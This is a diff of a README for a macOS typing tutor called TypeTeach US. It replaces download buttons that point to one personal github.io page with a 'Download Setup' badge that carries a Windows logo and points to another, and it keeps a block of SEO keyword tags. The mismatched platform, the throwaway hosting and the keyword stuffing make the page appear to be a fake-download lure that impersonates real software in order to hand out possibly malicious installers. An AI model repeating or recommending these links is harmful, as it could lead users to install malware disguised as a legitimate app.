@@ -2,12 +2,7 @@
 
 ![TypeTeach US Icon](https://static.macupdate.com/products/51456/l/typeteach-us-logo.png?v=1568322641)
 
-<!-- Download Button #1 — shield/badge style -->
-<div align="center" style="margin:14px 0 18px;">
-  <a href="https://rumpels-kaji.github.io/.github/Type">
-    <img src="https://img.shields.io/badge/⬇️_GET_TYPETEACH_US-royalblue?style=for-the-badge&logo=apple&logoColor=white" alt="Download TypeTeach US for macOS">
-  </a>
-</div>
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://abdullahdavilalvsm.github.io/.github/TypeTeach-US)
 
 ---
 
@@ -132,12 +127,3 @@ Exportable **CSV/JSON** and printable certificates are built in.
 ## 🏷 Tags (SEO)
 
 typeteach us • typing tutor mac • touch typing us keyboard • learn typing mac • number row typing • punctuation typing drills • adaptive typing lessons • accuracy first typing • wpm test mac • editing shortcuts typing • coding symbol practice • ergonomics typing coach • rhythm meter typing • classroom typing mac • offline typing app mac • apple silicon typing tutor
-
----
-
-<!-- Download Button #2 — pill/gradient style -->
-<div align="center" style="margin:18px 0 22px;">
-  <a href="https://rumpels-kaji.github.io/.github/Type" style="display:inline-block;padding:12px 22px;border-radius:999px;background:linear-gradient(90deg,#6366f1,#06b6d4);color:#fff;font-weight:900;text-decoration:none;box-shadow:0 10px 24px rgba(99,102,241,.28);">
-    🚀 Download TypeTeach US for macOS
-  </a>
-</div>
